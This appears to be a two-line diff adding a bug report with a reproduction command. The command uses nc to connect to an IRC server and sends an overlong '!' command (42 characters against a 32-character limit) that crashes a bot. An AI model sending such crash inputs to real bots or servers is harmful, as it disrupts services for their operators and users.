@@ -1,0 +1,2 @@
+makes bot crash (MAX_CMD_LEN is 32, and the data is checked against that) :
+(  sleep 2 ; echo NICK $USER;  echo USER $USER $USER $USER :$USER;  sleep 1;  echo "JOIN $CHANNEL";  sleep 1;  echo "PRIVMSG $DEST" :`python -c 'print "!" + "X" * 42'`;  echo "QUIT";  ) | nc $IRC_SERVER $IRC_PORT
